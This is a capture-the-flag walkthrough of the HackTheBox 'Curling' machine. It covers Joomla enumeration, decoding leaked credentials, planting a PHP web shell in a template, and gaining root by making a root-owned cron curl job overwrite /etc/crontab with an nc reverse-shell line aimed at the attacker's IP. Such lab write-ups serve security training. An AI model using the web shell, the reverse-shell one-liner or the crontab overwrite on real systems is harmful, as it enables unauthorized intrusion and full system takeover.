---
title: HTB | Curling
author: Zeropio
date: 2022-12-26
categories: [Pentesting, HackTheBox]
tags: [htb, linux, easy, machines]
permalink: /pentesting/htb/machines/curling
image:
  path: /assets/img/hackthebox/card/Curling.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

The web is running a Joomla:

```
http://10.10.10.150/ [200 OK] Apache[2.4.29], Bootstrap, Cookies[c0548020854924e0aecd05ed9f5b672b], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[c0548020854924e0aecd05ed9f5b672b], IP[10.10.10.150], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]
```

We can fuzz the web:

```
bin                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 48ms]
modules                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 49ms]
media                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 51ms]
libraries               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 51ms]
components              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 52ms]
plugins                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1602ms]
layouts                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 70ms]
includes                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 3613ms]
templates               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 3613ms]
tmp                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 3617ms]
language                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 4623ms]
cache                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 4627ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4636ms]
administrator           [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 4637ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 65ms]
                        [Status: 200, Size: 14243, Words: 762, Lines: 362, Duration: 110ms]
cli                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 45ms]
                        [Status: 200, Size: 14243, Words: 762, Lines: 362, Duration: 109ms]
                        [Status: 200, Size: 14243, Words: 762, Lines: 362, Duration: 115ms]
index.php               [Status: 200, Size: 14264, Words: 762, Lines: 362, Duration: 105ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 48ms]
.                       [Status: 200, Size: 14244, Words: 762, Lines: 362, Duration: 100ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 51ms]
configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 50ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 46ms]
README.txt              [Status: 200, Size: 4872, Words: 481, Lines: 73, Duration: 48ms]
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 4154ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 60ms]
htaccess.txt            [Status: 200, Size: 3005, Words: 438, Lines: 81, Duration: 67ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 49ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 45ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 50ms]
wp-forum.phps           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 46ms]
.htuser                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 54ms]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 46ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms]
.htaccess.old           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 49ms]
.htacess                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 49ms]
```

We can get the version of Joomla:

```console
$  curl -s http://10.10.10.150/README.txt | head -n 5
1- What is this?
        * This is a Joomla! installation/upgrade package to version 3.x
        * Joomla! Official site: https://www.joomla.org
        * Joomla! 3.8 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.8_version_history
        * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```

We can get a accurate version with:

```console
$  curl -s http://10.10.10.150/administrator/manifests/files/joomla.xml | xmllint --format -
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2018 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.8.8</version>
  <creationDate>May 2018</creationDate>
  <description>FILES_JOOMLA_XML_DESCRIPTION</description>
  <scriptfile>administrator/components/com_admin/script.php</scriptfile>
  <update>
. . . <SNIP> . . .
```

We can also use some automatic scanner for Joomla like [JoomScan](https://github.com/OWASP/joomscan) or JoomlaScan.

```console
$ perl joomscan.pl -u http://10.10.10.150/

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.8.8

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.10.150/administrator/components
http://10.10.10.150/administrator/modules
http://10.10.10.150/administrator/templates
http://10.10.10.150/images/banners

[+] Checking apache info/status files
[++] Readable info/status files are not found                                                                                                                
                                                                                                                                                             
[+] admin finder                                                                                                                                             
[++] Admin page : http://10.10.10.150/administrator/                                                                                                         
                                                                                                                                                             
[+] Checking robots.txt existing                                                                                                                             
[++] robots.txt is not found                                                                                                                                 
                                                                                                                                                             
[+] Finding common backup files name                                                                                                                         
[++] Backup files are not found                                                                                                                              
                                                                                                                                                             
[+] Finding common log files name                                                                                                                            
[++] error log is not found                                                                                                                                  
                                                                                                                                                             
[+] Checking sensitive config.php.x file                                                                                                                     
[++] Readable config files are not found
```

This version doesn’t appear to be a vulnerable one. Also, we don’t have any webpage we could attack.

Inspecting the source code we can find a `secret.txt`{: .filepath}:

```
$ $ curl http://10.10.10.150/secret.txt | base64 -d
Curling2018!
```

The pair of credentials `Floris:Curling2018!` will work.

---

# Footprint

## Initial Access

With admin privileges we can go to `Templates > Templtates > Protostar > error.php`. And add the line `system($_GET['cmd']);`. Now we have RCE:

```console
$ curl -s http://10.10.10.150/templates/protostar/error.php/error.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

We can see only the user ************Floris************ under the `/home`{: .filepath} directory. Under that directory we found some files but only one can be accesible.

```console
$ cat password_backup
	00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
	00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
	00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
	00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
	00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
	00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
	00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
	00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
	00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
	00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
	000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
	000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
	000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
	000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
	000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
	000000f0: 819b bb48                                ...H
```

With Cyberchef we can easily decode it and see a `password.txt`{: .filepath} file with a string: `5d<wdCbdZu)|hChXll`. Now we can SSH with the user.

We found some services running:

```console
floris@curling:~$ nc -z -v 127.0.0.1 1-65535 2>&1 | grep -v 'Connection refused'
Connection to 127.0.0.1 22 port [tcp/ssh] succeeded!
Connection to 127.0.0.1 80 port [tcp/http] succeeded!
Connection to 127.0.0.1 3306 port [tcp/mysql] succeeded!
Connection to 127.0.0.1 38602 port [tcp/*] succeeded!
Connection to 127.0.0.1 38690 port [tcp/*] succeeded!
Connection to 127.0.0.1 45110 port [tcp/*] succeeded!
```

With `pspy` we can see they are doing cURL request to files in our home folder:

```
2022/12/26 22:36:01 CMD: UID=0    PID=27843  | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
2022/12/26 22:36:01 CMD: UID=0    PID=27846  | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

We can make the root send a reverse shell. First, modify the crontab:

```console
$ cp /etc/crontab .
$ $ echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 9000 >/tmp/f ' >> crontab
$ python3 -m http.server 80
```

Start a netcat and change the file `/home/floris/admin-area/input` to:

```
url = "http://10.10.14.4/crontab"
output = "/etc/crontab"
```

Wait a few seconds and we have our root reverse shell.
